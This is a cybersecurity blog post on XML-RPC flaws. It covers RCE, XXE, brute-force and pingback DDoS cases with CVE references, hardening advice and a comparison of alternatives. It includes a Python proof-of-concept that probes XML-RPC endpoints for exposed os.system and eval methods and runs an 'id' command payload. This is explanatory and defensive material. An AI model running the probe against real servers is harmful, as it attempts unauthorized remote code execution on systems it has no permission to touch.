---
title: "XML-RPC Security Vulnerabilities Analysis and Mitigation Strategies"
date: 2025-03-28
draft: false
tags: ["XML-RPC", "Security", "RCE", "Exploit"]
categories: ["Cybersecurity"]
---


**XML-RPC Security Series:**

- [Series 1 - XML-RPC Security Vulnerabilities Analysis and Mitigation Strategies](https://windshock.github.io/en/post/2025-03-28-xml-rpc-security-vulnerabilities-analysis-and-mitigation-strategies/)
- [Series 2 - CVE-2019-17570: Apache XML-RPC Exploit](https://windshock.github.io/en/post/2025-04-24-cve-2019-17570-apache-xmlrpc/)
- [Series 3 - Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned](https://windshock.github.io/en/post/2025-05-30-rce-via-exception-serialization-in-openstack-nova/)

![XML-RPC background](/images/post/xmlrpc-security.webp)

## Summary

- **Overview of XML-RPC Vulnerabilities:** As a lightweight remote call protocol for inter-system communication, XML-RPC is exposed to various threats such as RCE, XXE, DDoS, and privilege escalation.
- **Notable Cases:** NodeBB (CVE-2023-43187), Apache OFBiz (CVE-2020-9496), PHP XML-RPC (CVE-2005-1921), etc.
- **Real-World Use Cases:** In addition to WordPress, Bugzilla, ManageEngine, and Apache OFBiz, XML-RPC is still used in some legacy systems.
- **Mitigation Strategies:** Disabling XML-RPC, enhancing input validation, reinforcing authentication systems, applying up-to-date security patches, implementing access control, and deploying WAFs.

## What is XML-RPC?

**XML-RPC (XML Remote Procedure Call)** is a remote procedure call protocol that uses XML as its data format and HTTP as its transport mechanism. Proposed jointly by Dave Winer and Microsoft in 1998, it was designed to simplify cross-platform communication.

### Basic Principles

- The client sends a request in XML format, and the server responds in XML.
- It can easily pass through firewalls using standard HTTP(S).

### History of XML-RPC

XML-RPC was widely used in early web services and implemented in various languages including Perl, Java, Python, C, and PHP. Although it later evolved into SOAP, it is still used in some environments due to its simplicity.

### Current Status of XML-RPC

Its use is declining with the advent of newer technologies such as RESTful APIs and gRPC. WordPress is transitioning to REST API, and XML-RPC is now mostly limited to legacy systems.

## Vulnerability Analysis

### 1. XML Injection & Remote Code Execution (RCE)

- **NodeBB (CVE-2023-43187):** RCE possible due to lack of XML input validation
- **Apache OFBiz (CVE-2020-9496):** RCE via Java deserialization
- **PHP XML-RPC (CVE-2005-1921):** RCE through misuse of `eval()`

### 2. XXE (XML External Entity)

- **Apache XML-RPC (CVE-2016-5002):** Local file exposure and SSRF possible due to missing external entity deactivation

### 3. DDoS and Brute Force Attacks

- **system.multicall:** Automates brute force attacks
- **pingback.ping:** Facilitates DDoS reflection attacks

### 4. Authentication Bypass & Privilege Escalation

- **WordPress (CVE-2020-28036):** Authentication bypass via XML-RPC

## Real-World Attack Cases

- **SonicWall Report (2018):** Over 100,000 XML-RPC attacks detected
- **WPbrutebot:** XML-RPC-based brute-force attack tool
- **Pingback DDoS:** Large-scale reflection attacks using XML-RPC

## XML-RPC Exploit Example

The following is a Python-based PoC code to detect RCE vulnerabilities in XML-RPC and its execution screen:

![xmlrpc poc code output](/images/post/xmlrpc-rce.webp)

```python
import xmlrpc.client
import ssl
import http.client

candidate_methods = [
    "os.system",
    "commands.getoutput",
    "subprocess.check_output",
]

candidate_methods_eval = [
    "__builtin__.eval",
    "builtins.eval",
]

rpc_urls = [
    "https://xxx.com/cgi-bin/rpc.cgi",
]

context = ssl._create_unverified_context()

class UnverifiedTransport(xmlrpc.client.SafeTransport):
    def make_connection(self, host):
        return http.client.HTTPSConnection(host, context=context)

for rpc_url in rpc_urls:
    print(f"[+] Scanning target: {rpc_url}")
    client = xmlrpc.client.ServerProxy(rpc_url, transport=UnverifiedTransport())

    for method in candidate_methods:
        try:
            parts = method.split(".")
            obj = getattr(client, parts[0])
            func = getattr(obj, parts[1])
            print(f"[>] Trying {method}('id')...")
            result = func('id')
            if isinstance(result, bytes):
                result = result.decode()
            print(f"[✔] {method} → Success! Result: {result}\n")
        except Exception as e:
            print(f"[-] {method} blocked: {e}")

    for method in candidate_methods_eval:
        try:
            parts = method.split(".")
            obj = getattr(client, parts[0])
            func = getattr(obj, parts[1])
            payload = '__import__("commands").getoutput("id")'
            print(f"[>] Trying {method}('{payload}')...")
            result = func(payload)
            if isinstance(result, bytes):
                result = result.decode()
            print(f"[✔] {method} → Success! Result: {result}\n")
        except Exception as e:
            print(f"[-] {method} blocked: {e}")
```

> ⚠️ Use this script **only in authorized environments**.

## Major Services Using XML-RPC

| System         | Usage Examples                           |
| -------------- | ----------------------------------------- |
| WordPress      | Posting, comments, pingbacks (moving to REST) |
| Bugzilla       | Bug submission and update API            |
| ManageEngine   | User account and password management     |
| Apache OFBiz   | ERP integration API                      |

## Security Hardening Measures

- Disable XML-RPC (via .htaccess, web server config, plugins)
- Enhance input validation (regex-based)
- Apply XXE prevention settings
- Use API keys, OAuth, JWT authentication
- Restrict access by IP
- Deploy Web Application Firewall (WAF)
- Monitor logs and conduct regular vulnerability assessments

## Modern Alternatives Comparison

| Criteria    | XML-RPC | REST     | GraphQL   |
| ----------- | -------- | -------- | --------- |
| Data Format | XML      | JSON     | JSON      |
| Structure   | Method-based | Resource-based | Query-based |
| Scalability | Low      | High     | Very High |
| Security    | Low      | Medium+  | Medium+   |
| Strengths   | Simple implementation | Cacheable | Minimized data queries |

## Conclusion & Recommendations

- **Avoid using XML-RPC due to high security risks.**
- **If unavoidable, apply strong authentication and access control.**
- **Actively consider migrating to REST or GraphQL.**

## Reference Links

- [XML-RPC - Wikipedia](https://ko.wikipedia.org/wiki/XML-RPC)
- [CVE-2023-43187 - NodeBB XML Injection](https://nvd.nist.gov/vuln/detail/CVE-2023-43187)
- [CVE-2020-9496 - Apache OFBiz RCE](https://nvd.nist.gov/vuln/detail/CVE-2020-9496)
- [CVE-2005-1921 - PHP XMLRPC Code Injection](https://nvd.nist.gov/vuln/detail/CVE-2005-1921)
- [CVE-2016-5002 - Apache XML-RPC XXE](https://nvd.nist.gov/vuln/detail/CVE-2016-5002)
- [WordPress XML-RPC Security Guide (SolidWP)](https://solidwp.com/blog/xmlrpc-php/)
- [SonicWall XML-RPC Attack Analysis Report](https://www.sonicwall.com/blog/major-attempt-to-exploit-xml-rpc-remote-code-injection-vulnerability-is-observed)


